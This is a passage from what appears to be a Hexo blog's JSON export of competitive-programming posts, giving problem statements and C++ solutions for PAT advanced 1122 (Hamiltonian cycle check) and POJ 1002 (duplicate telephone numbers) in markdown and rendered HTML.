class=\"literal\">true</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (z != find(z))</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tjoin(y, z);</div><div class=\"line\">\t\t\t\tfa[z] = find(y);</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tjoin(z, y);</div><div class=\"line\">\t\t\t\tfa[y] = find(z);</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= maxN + <span class=\"number\">1</span>; i++)</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (e[i])</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tbn++;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pre[i] == i)tn++;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d %d\\n\"</span>, tn, bn);</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;q);</div><div class=\"line\">\t<span class=\"keyword\">while</span> (q--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;a, &amp;b);</div><div class=\"line\">\t\t(find(a) == find(b)) ? <span class=\"built_in\">printf</span>(<span class=\"string\">\"Yes\\n\"</span>) : <span class=\"built_in\">printf</span>(<span class=\"string\">\"No\\n\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1122","date":"2017-02-27T15:25:13.000Z","_content":"\n## Description\n\n> 1122.Hamiltonian Cycle\n\n> The \"Hamilton cycle problem\" is to find a simple cycle that contains every vertex in a graph. Such a cycle is called a \"Hamiltonian cycle\".\n\n> In this problem, you are supposed to tell if a given cycle is a Hamiltonian cycle.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line contains 2 positive integers N (2< N <= 200), the number of vertices, and M, the number of edges in an undirected graph. Then M lines follow, each describes an edge in the format \"Vertex1 Vertex2\", where the vertices are numbered from 1 to N. The next line gives a positive integer K which is the number of queries, followed by K lines of queries, each in the format:\n\n> n V1 V2 ... Vn\n\n> where n is the number of vertices in the list, and Vi's are the vertices on a path.\n\n> Output Specification:\n\n> For each query, print in a line \"YES\" if the path does form a Hamiltonian cycle, or \"NO\" if not.\n\n> Sample Input:\n6 10\n6 2\n3 4\n1 5\n2 5\n3 1\n4 1\n1 6\n6 3\n1 2\n4 5\n6\n7 5 1 4 3 6 2 5\n6 5 1 4 3 6 2\n9 6 2 1 6 3 4 5 2 6\n4 1 2 5 1\n7 6 1 3 4 5 2 6\n7 6 1 2 5 4 3 1\nSample Output:\nYES\nNO\nNO\nNO\nYES\nNO\n\n伪哈密顿图。\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<algorithm>\n#include<vector>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 2e2 + 10;\nconst int maxM = 2e4 + 10;\n\nint n, m, k;\nint e[maxN][maxN];\nint ans[maxN];\nint s[maxN];\nint x, y;\n\nint main()\n{\n\tscanf(\"%d%d\", &n, &m);\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tscanf(\"%d%d\", &x, &y);\n\t\te[x][y] = e[y][x] = 1;\n\t}\n\tscanf(\"%d\", &k);\n\twhile (k--)\n\t{\n\t\tint p;\n\t\tscanf(\"%d\", &p);\n\t\tint flag = p >= n + 1;\n\t\tfor (int i = 1; i <= p; i++)\n\t\t\tscanf(\"%d\", &ans[i]);\n\t\tflag &= ans[1] == ans[p];\n\t\tfor (int i = 1; i <= maxN; i++)s[i] = 0;\n\t\tfor (int i = 1; i < p; i++)\n\t\t{\n\t\t\tif (s[ans[i]]++) flag = 0;\n\t\t\tflag &= e[ans[i]][ans[i + 1]];\n\t\t}\n\t\tprintf(\"%s\\n\", flag ? \"YES\" : \"NO\");\n\t}\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1122.md","raw":"---\ntitle: PAT advanced 1122\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-27 23:25:13\n---\n\n## Description\n\n> 1122.Hamiltonian Cycle\n\n> The \"Hamilton cycle problem\" is to find a simple cycle that contains every vertex in a graph. Such a cycle is called a \"Hamiltonian cycle\".\n\n> In this problem, you are supposed to tell if a given cycle is a Hamiltonian cycle.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line contains 2 positive integers N (2< N <= 200), the number of vertices, and M, the number of edges in an undirected graph. Then M lines follow, each describes an edge in the format \"Vertex1 Vertex2\", where the vertices are numbered from 1 to N. The next line gives a positive integer K which is the number of queries, followed by K lines of queries, each in the format:\n\n> n V1 V2 ... Vn\n\n> where n is the number of vertices in the list, and Vi's are the vertices on a path.\n\n> Output Specification:\n\n> For each query, print in a line \"YES\" if the path does form a Hamiltonian cycle, or \"NO\" if not.\n\n> Sample Input:\n6 10\n6 2\n3 4\n1 5\n2 5\n3 1\n4 1\n1 6\n6 3\n1 2\n4 5\n6\n7 5 1 4 3 6 2 5\n6 5 1 4 3 6 2\n9 6 2 1 6 3 4 5 2 6\n4 1 2 5 1\n7 6 1 3 4 5 2 6\n7 6 1 2 5 4 3 1\nSample Output:\nYES\nNO\nNO\nNO\nYES\nNO\n\n伪哈密顿图。\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<algorithm>\n#include<vector>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 2e2 + 10;\nconst int maxM = 2e4 + 10;\n\nint n, m, k;\nint e[maxN][maxN];\nint ans[maxN];\nint s[maxN];\nint x, y;\n\nint main()\n{\n\tscanf(\"%d%d\", &n, &m);\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tscanf(\"%d%d\", &x, &y);\n\t\te[x][y] = e[y][x] = 1;\n\t}\n\tscanf(\"%d\", &k);\n\twhile (k--)\n\t{\n\t\tint p;\n\t\tscanf(\"%d\", &p);\n\t\tint flag = p >= n + 1;\n\t\tfor (int i = 1; i <= p; i++)\n\t\t\tscanf(\"%d\", &ans[i]);\n\t\tflag &= ans[1] == ans[p];\n\t\tfor (int i = 1; i <= maxN; i++)s[i] = 0;\n\t\tfor (int i = 1; i < p; i++)\n\t\t{\n\t\t\tif (s[ans[i]]++) flag = 0;\n\t\t\tflag &= e[ans[i]][ans[i + 1]];\n\t\t}\n\t\tprintf(\"%s\\n\", flag ? \"YES\" : \"NO\");\n\t}\n\treturn 0;\n}\n```","slug":"PAT-advanced-1122","published":1,"updated":"2017-02-27T15:28:09.646Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k170031hv187cudcwew","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1122.Hamiltonian Cycle</p>\n<p>The “Hamilton cycle problem” is to find a simple cycle that contains every vertex in a graph. Such a cycle is called a “Hamiltonian cycle”.</p>\n<p>In this problem, you are supposed to tell if a given cycle is a Hamiltonian cycle.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line contains 2 positive integers N (2&lt; N &lt;= 200), the number of vertices, and M, the number of edges in an undirected graph. Then M lines follow, each describes an edge in the format “Vertex1 Vertex2”, where the vertices are numbered from 1 to N. The next line gives a positive integer K which is the number of queries, followed by K lines of queries, each in the format:</p>\n<p>n V1 V2 … Vn</p>\n<p>where n is the number of vertices in the list, and Vi’s are the vertices on a path.</p>\n<p>Output Specification:</p>\n<p>For each query, print in a line “YES” if the path does form a Hamiltonian cycle, or “NO” if not.</p>\n<p>Sample Input:<br>6 10<br>6 2<br>3 4<br>1 5<br>2 5<br>3 1<br>4 1<br>1 6<br>6 3<br>1 2<br>4 5<br>6<br>7 5 1 4 3 6 2 5<br>6 5 1 4 3 6 2<br>9 6 2 1 6 3 4 5 2 6<br>4 1 2 5 1<br>7 6 1 3 4 5 2 6<br>7 6 1 2 5 4 3 1<br>Sample Output:<br>YES<br>NO<br>NO<br>NO<br>YES<br>NO</p>\n</blockquote>\n<p>伪哈密顿图。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">2e2</span> + <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxM = <span class=\"number\">2e4</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n, m, k;</div><div class=\"line\"><span class=\"keyword\">int</span> e[maxN][maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> ans[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> s[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> x, y;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;n, &amp;m);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;x, &amp;y);</div><div class=\"line\">\t\te[x][y] = e[y][x] = <span class=\"number\">1</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;k);</div><div class=\"line\">\t<span class=\"keyword\">while</span> (k--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> p;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;p);</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> flag = p &gt;= n + <span class=\"number\">1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= p; i++)</div><div class=\"line\">\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;ans[i]);</div><div class=\"line\">\t\tflag &amp;= ans[<span class=\"number\">1</span>] == ans[p];</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= maxN; i++)s[i] = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt; p; i++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (s[ans[i]]++) flag = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t\tflag &amp;= e[ans[i]][ans[i + <span class=\"number\">1</span>]];</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\\n\"</span>, flag ? <span class=\"string\">\"YES\"</span> : <span class=\"string\">\"NO\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1122.Hamiltonian Cycle</p>\n<p>The “Hamilton cycle problem” is to find a simple cycle that contains every vertex in a graph. Such a cycle is called a “Hamiltonian cycle”.</p>\n<p>In this problem, you are supposed to tell if a given cycle is a Hamiltonian cycle.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line contains 2 positive integers N (2&lt; N &lt;= 200), the number of vertices, and M, the number of edges in an undirected graph. Then M lines follow, each describes an edge in the format “Vertex1 Vertex2”, where the vertices are numbered from 1 to N. The next line gives a positive integer K which is the number of queries, followed by K lines of queries, each in the format:</p>\n<p>n V1 V2 … Vn</p>\n<p>where n is the number of vertices in the list, and Vi’s are the vertices on a path.</p>\n<p>Output Specification:</p>\n<p>For each query, print in a line “YES” if the path does form a Hamiltonian cycle, or “NO” if not.</p>\n<p>Sample Input:<br>6 10<br>6 2<br>3 4<br>1 5<br>2 5<br>3 1<br>4 1<br>1 6<br>6 3<br>1 2<br>4 5<br>6<br>7 5 1 4 3 6 2 5<br>6 5 1 4 3 6 2<br>9 6 2 1 6 3 4 5 2 6<br>4 1 2 5 1<br>7 6 1 3 4 5 2 6<br>7 6 1 2 5 4 3 1<br>Sample Output:<br>YES<br>NO<br>NO<br>NO<br>YES<br>NO</p>\n</blockquote>\n<p>伪哈密顿图。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">2e2</span> + <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxM = <span class=\"number\">2e4</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n, m, k;</div><div class=\"line\"><span class=\"keyword\">int</span> e[maxN][maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> ans[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> s[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> x, y;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;n, &amp;m);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;x, &amp;y);</div><div class=\"line\">\t\te[x][y] = e[y][x] = <span class=\"number\">1</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;k);</div><div class=\"line\">\t<span class=\"keyword\">while</span> (k--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> p;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;p);</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> flag = p &gt;= n + <span class=\"number\">1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= p; i++)</div><div class=\"line\">\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;ans[i]);</div><div class=\"line\">\t\tflag &amp;= ans[<span class=\"number\">1</span>] == ans[p];</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= maxN; i++)s[i] = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt; p; i++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (s[ans[i]]++) flag = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t\tflag &amp;= e[ans[i]][ans[i + <span class=\"number\">1</span>]];</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\\n\"</span>, flag ? <span class=\"string\">\"YES\"</span> : <span class=\"string\">\"NO\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"POJ 1002","date":"2017-03-12T14:34:54.000Z","_content":"\n## Description\n\n> Businesses like to have memorable telephone numbers. One way to make a telephone number memorable is to have it spell a memorable word or phrase. For example, you can call the University of Waterloo by dialing the memorable TUT-GLOP. Sometimes only part of the number is used to spell a word. When you get back to your hotel tonight you can order a pizza from Gino's by dialing 310-GINO. Another way to make a telephone number memorable is to group the digits in a memorable way. You could order your pizza from Pizza Hut by calling their \"three tens'' number 3-10-10-10. \n\n> The standard form of a telephone number is seven decimal digits with a hyphen between the third and fourth digits (e.g. 888-1200). The keypad of a phone supplies the mapping of letters to numbers, as follows: \n\n> A, B, and C map to 2 \nD, E, and F map to 3 \nG, H, and I map to 4 \nJ, K, and L map to 5 \nM, N, and O map to 6 \nP, R, and S map to 7 \nT, U, and V map to 8 \nW, X, and Y map to 9 \n\n> There is no mapping for Q or Z. Hyphens are not dialed, and can be added and removed as necessary. The standard form of TUT-GLOP is 888-4567, the standard form of 310-GINO is 310-4466, and the standard form of 3-10-10-10 is 310-1010. \n\n> Two telephone numbers are equivalent if they have the same standard form. (They dial the same number.) \n\n> Your company is compiling a directory of telephone numbers from local businesses. As part of the quality control process you want to check that no two (or more) businesses in the directory have the same telephone number. \n\n> Input\n\n> The input will consist of one case. The first line of the input specifies the number of telephone numbers in the directory (up to 100,000) as a positive integer alone on the line. The remaining lines list the telephone numbers in the directory, with each number alone on a line. Each telephone number consists of a string composed of decimal digits, uppercase letters (excluding Q and Z) and hyphens. Exactly seven of the characters in the string will be digits or letters. \nOutput\n\n> Generate a line of output for each telephone number that appears more than once in any form. The line should give the telephone number in standard form, followed by a space, followed by the number of times the telephone number appears in the directory. Arrange the output lines by telephone number in ascending lexicographical order. If there are no duplicates in the input print the line: \n\n> No duplicates. \n\n> Sample Input\n12\n4873279\nITS-EASY\n888-4567\n3-10-10-10\n888-GLOP\nTUT-GLOP\n967-11-11\n310-GINO\nF101010\n888-1200\n-4-8-7-3-2-7-9-\n487-3279\n\n> Sample Output\n 310-1010 2\n487-3279 4\n888-4567 3\n\n我用了`map`，纯偷懒的方法。因为`map`的内部是红黑树的实现，所以速度还是比较快的。\n看了别人的方法，还有其他的实现：\n1. 快排\n2. 哈希表\n3. **Trie树（前缀树/字典树）**，这个应该是最快的方法\n\n## Code\n\n```\n#include<cstdio>\n#include<string>\n#include<iostream>\n#include<algorithm>\n#include<vector>\n#include<stack>\n#include<queue>\n#include<map>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e5 + 10;\n\nmap<string , int>tel;\n\nint n;\nint flag = 0;\nstring a;\n\nchar get(char c)\n{\n\tif (c >= 'A' && c <= 'P')\n\t\treturn (c - 'A') / 3 + 2 + '0';\n\tif (c >= 'R' && c <= 'Y')\n\t\treturn (c - 'A' - 1) / 3 + 2 + '0';\n\tif (c >= '0' && c <= '9')\n\t\treturn c ;\n\treturn c;\n}\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\tgetchar();\n\tfor (int i = 0; i < n;)\n\t{\n\t\ta = \"\";\n\t\tfor (int j = 0;;)\n\t\t{\n\t\t\tchar x = getchar();\n\t\t\tchar y = get(x);\n\t\t\tif (j == 3)\n\t\t\t{\n\t\t\t\ta += '-';\n\t\t\t\tj++;\n\t\t\t}\n\t\t\tif (y == '-')\n\t\t\t\tcontinue;\n\t\t\tif (y == '\\n')\n\t\t\t{\n\t\t\t\ti++;\n\t\t\t\ttel[a]++;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\ta += y;\n\t\t\tj++;\n\t\t}\n\t}\n\tmap<string, int>::iterator it;\n\tfor (it = tel.begin(); it != tel.end(); it++)\n\t{\n\t\tif (it->second > 1)\n\t\t{\n\t\t\tflag = 1;\n\t\t\tcout << it->first << ' ' << it->second << endl;\n\t\t}\n\t\telse\n\t\t\tcontinue;\n\t}\n\tif (!flag)\n\t\tcout << \"No duplicates.\\n\";\n\treturn 0;\n}\n```","source":"_posts/POJ-1002.md","raw":"---\ntitle: POJ 1002\ntags:\n  - POJ\ncategories: []\ndate: 2017-03-12 22:34:54\n---\n\n## Description\n\n> Businesses like to have memorable telephone numbers. One way to make a telephone number memorable is to have it spell a memorable word or phrase. For example, you can call the University of Waterloo by dialing the memorable TUT-GLOP. Sometimes only part of the number is used to spell a word. When you get back to your hotel tonight you can order a pizza from Gino's by dialing 310-GINO. Another way to make a telephone number memorable is to group the digits in a memorable way. You could order your pizza from Pizza Hut by calling their \"three tens'' number 3-10-10-10. \n\n> The standard form of a telephone number is seven decimal digits with a hyphen between the third and fourth digits (e.g. 888-1200). The keypad of a phone supplies the mapping of letters to numbers, as follows: \n\n> A, B, and C map to 2 \nD, E, and F map to 3 \nG, H, and I map to 4 \nJ, K, and L map to 5 \nM, N, and O map to 6 \nP, R, and S map to 7 \nT, U, and V map to 8 \nW, X, and Y map to 9 \n\n> There is no mapping for Q or Z. Hyphens are not dialed, and can be added and removed as necessary. The standard form of TUT-GLOP is 888-4567, the standard form of 310-GINO is 310-4466, and the standard form of 3-10-10-10 is 310-1010. \n\n> Two telephone numbers are equivalent if they have the same standard form. (They dial the same number.) \n\n> Your company is compiling a directory of telephone numbers from local businesses. As part of the quality control process you want to check that no two (or more) businesses in the directory have the same telephone number. \n\n> Input\n\n> The input will consist of one case. The first line of the input specifies the number of telephone numbers in the directory (up to 100,000) as a positive integer alone on the line. The remaining lines list the telephone numbers in the directory, with each number alone on a line. Each telephone number consists of a string composed of decimal digits, uppercase letters (excluding Q and Z) and hyphens. Exactly seven of the characters in the string will be digits or letters. \nOutput\n\n> Generate a line of output for each telephone number that appears more than once in any form. The line should give the telephone number in standard form, followed by a space, followed by the number of times the telephone number appears in the directory. Arrange the output lines by telephone number in ascending lexicographical order. If there are no duplicates in the input print the line: \n\n> No duplicates. \n\n> Sample Input\n12\n4873279\nITS-EASY\n888-4567\n3-10-10-10\n888-GLOP\nTUT-GLOP\n967-11-11\n310-GINO\nF101010\n888-1200\n-4-8-7-3-2-7-9-\n487-3279\n\n> Sample Output\n 310-1010 2\n487-3279 4\n888-4567 3\n\n我用了`map`，纯偷懒的方法。因为`map`的内部是红黑树的实现，所以速度还是比较快的。\n看了别人的方法，还有其他的实现：\n1. 快排\n2. 哈希表\n3. **Trie树（前缀树/字典树）**，这个应该是最快的方法\n\n## Code\n\n```\n#include<cstdio>\n#include<string>\n#include<iostream>\n#include<algorithm>\n#include<vector>\n#include<stack>\n#include<queue>\n#include<map>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e5 + 10;\n\nmap<string , int>tel;\n\nint n;\nint flag = 0;\nstring a;\n\nchar get(char c)\n{\n\tif (c >= 'A' && c <= 'P')\n\t\treturn (c - 'A') / 3 + 2 + '0';\n\tif (c >= 'R' && c <= 'Y')\n\t\treturn (c - 'A' - 1) / 3 + 2 + '0';\n\tif (c >= '0' && c <= '9')\n\t\treturn c ;\n\treturn c;\n}\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\tgetchar();\n\tfor (int i = 0; i < n;)\n\t{\n\t\ta = \"\";\n\t\tfor (int j = 0;;)\n\t\t{\n\t\t\tchar x = getchar();\n\t\t\tchar y = get(x);\n\t\t\tif (j == 3)\n\t\t\t{\n\t\t\t\ta += '-';\n\t\t\t\tj++;\n\t\t\t}\n\t\t\tif (y == '-')\n\t\t\t\tcontinue;\n\t\t\tif (y == '\\n')\n\t\t\t{\n\t\t\t\ti++;\n\t\t\t\ttel[a]++;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\ta += y;\n\t\t\tj++;\n\t\t}\n\t}\n\tmap<string, int>::iterator it;\n\tfor (it = tel.begin(); it != tel.end(); it++)\n\t{\n\t\tif (it->second > 1)\n\t\t{\n\t\t\tflag = 1;\n\t\t\tcout << it->first << ' ' << it->second << endl;\n\t\t}\n\t\telse\n\t\t\tcontinue;\n\t}\n\tif (!flag)\n\t\tcout << \"No duplicates.\\n\";\n\treturn 0;\n}\n```","slug":"POJ-1002","published":1,"updated":"2017-03-12T14:57:27.021Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k190033hv18ctauu4pe","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>Businesses like to have memorable telephone numbers. One way to make a telephone number memorable is to have it spell a memorable word or phrase. For example, you can call the University of Waterloo by dialing the memorable TUT-GLOP. Sometimes only part of the number is used to spell a word. When you get back to your hotel tonight you can order a pizza from Gino’s by dialing 310-GINO. Another way to make a telephone number memorable is to group the digits in a memorable way. You could order your pizza from Pizza Hut by calling their “three tens’’ number 3-10-10-10. </p>\n<p>The standard form of a telephone number is seven decimal digits with a hyphen between the third and fourth digits (e.g. 888-1200). The keypad of a phone supplies the mapping of letters to numbers, as follows: </p>\n<p>A, B, and C map to 2<br>D, E, and F map to 3<br>G, H, and I map to 4<br>J, K, and L map to 5<br>M, N, and O map to 6<br>P, R, and S map to 7<br>T, U, and V map to 8<br>W, X, and Y map to 9 </p>\n<p>There is no mapping for Q or Z. Hyphens are not dialed, and can be added and removed as necessary. The standard form of TUT-GLOP is 888-4567, the standard form of 310-GINO is 310-4466, and the standard form of 3-10-10-10 is 310-1010. </p>\n<p>Two telephone numbers are equivalent if they 